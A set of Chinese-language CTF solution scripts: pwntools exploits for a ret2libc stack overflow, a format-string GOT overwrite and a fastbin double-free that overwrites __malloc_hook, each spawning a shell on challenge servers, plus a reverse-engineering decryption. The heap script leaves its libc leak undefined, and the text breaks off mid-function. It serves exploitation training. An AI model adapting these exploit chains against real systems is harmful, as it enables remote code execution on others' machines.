### 案例1：ret2libc - BUUCTF [BJDCTF 2nd]r2t3

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 64位ELF
# 2. NX开启, 无PIE
# 3. 存在栈溢出
# 4. 有puts函数可泄露libc

elf = ELF('./r2t3')
p = remote('node4.buuoj.cn', 29601)

# 找到gadget
pop_rdi_ret = 0x400933  # ROPgadget查找

# 第一段: 泄露puts地址
payload = b'A' * 0x20 + b'B' * 8  # 填充+saved rbp
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)

# 泄露地址
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc = ELF('./libc-2.27.so')
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

# 第二段: getshell
payload2 = b'A' * 0x20 + b'B' * 8
payload2 += p64(pop_rdi_ret + 1)  # ret对齐
payload2 += p64(pop_rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

### 案例2：格式化字符串 - BUUCTF [Harekaze]fmt

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 格式化字符串漏洞
# 2. 格式化字符串在栈上
# 3. 偏移为8

p = remote('node4.buuoj.cn', 29559)
elf = ELF('./fmt')

# 确定偏移
p.sendline(b'%9$p')
# 输出确认偏移

# 泄露栈地址
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')
# 分析输出找到栈地址

# 利用fmtstr_payload修改got表
# 将printf的got改为system
printf_got = elf.got['printf']
system_addr = 0x401234  # 如果system在程序中

# 使用pwntools的fmtstr_payload
payload = fmtstr_payload(8, {printf_got: system_addr}, write_size='short')
p.sendline(payload)

# 再次输入/bin/sh触发system
p.sendline(b'/bin/sh\x00')
p.interactive()
```

### 案例3：堆利用 - fastbin dup

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 菜单: add, delete, show
# 2. 限制size为0x60（fastbin范围）
# 3. 无double free检查

p = remote('ctf.example.com', 9999)
libc = ELF('./libc-2.23.so')

def add(size, data):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'content:', data)

def free(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'index:', str(idx).encode())

# 1. 泄露libc
add(0x60, b'A' * 8)  # 0
add(0x60, b'B' * 8)  # 1
add(0x60, b'C' * 8)  # 2 - 防止与top合并
free(1)
# 利用其他漏洞泄露libc地址
# ... 省略泄露部分
libc_base = leaked_addr - libc.symbols['__malloc_hook'] - 0x10

# 2. fastbin dup
free(0)
free(1)
free(0)  # double free

# 3. 覆盖fd
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x45226  # one_gadget地址

add(0x60, p64(malloc_hook - 0x23))  # 修改fd指向fake chunk
add(0x60, b'filler')
add(0x60, b'filler')
add(0x60, b'A' * 0x13 + p64(one_gadget))  # 写入one_gadget

# 4. 触发
p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'size:', b'32')
p.interactive()
```

### 案例4：逆向 - 攻防世界 re1

```python
# 题目分析:
# 1. Windows PE程序
# 2. 输入字符串，与加密后的Flag比较
# 3. 使用IDA静态分析

# IDA分析结果:
"""
关键代码:
v5 = 0;
while (v5 < strlen(input)) {
    if (v5 & 1)
        input[v5] -= 2;  // 奇数位: 减2
    else
        input[v5] += 5;  // 偶数位: 加5
    v5++;
}
if (strcmp(input, target) == 0) {
    printf("Correct");
}
"""

# 逆向解密:
target = "kinds_of_char_here"  # 从程序中提取的加密后字符串

def decrypt(encrypted):
    result = list(encrypted)
    for i in range(len(result)):
        c = ord(result[i])
        if i & 1:
            c += 2  # 奇数位逆向: 加2
        else:
            c -= 5  # 偶数位逆向: 减5
        result[i] = chr(c)
    return ''.join(result)

flag = decrypt(target)
print(f"[+] Flag: flag{{{flag}}}")
```

# 脱壳后分析 - 简单异或加密
def solve():
    # 从程序中提取的加密Flag
    encrypted = [0x1e, 0x1a, 0x0d, 0x15, 0x46, 0x1e, 0x1a, 0x0d]
    
    # 异或密钥（从逆向分析得到）
